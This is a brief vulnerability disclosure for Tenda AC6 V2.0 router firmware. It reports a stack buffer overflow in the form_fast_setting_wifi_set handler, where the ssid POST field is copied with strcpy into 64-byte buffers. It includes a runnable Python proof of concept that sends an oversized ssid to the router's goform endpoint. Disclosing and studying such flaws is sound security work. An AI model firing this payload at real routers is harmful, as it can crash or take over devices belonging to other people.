# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "form_fast_setting_wifi_set"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/102855)

In the `form_fast_setting_wifi_set` function, a user-crafted POST request can pass the **`ssid` variable** to the backend. Inside the function, **`strcpy` is used directly to write this variable into the stack-allocated buffers `ssid_24g[64]` and `ssid_5g[64]` without any prior validation**. This easily leads to a **stack overflow**.

![image-20250618165329584](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618165329584.png)

poc

```
import requests
def send_payload(url, payload):
    params={
            'ssid':payload
            }
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2000+b'\n'
url="http://192.168.1.1/goform/fast_setting_wifi_set"
send_payload(url, payload)   
```

![image-20250618165436040](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250618165436040.png)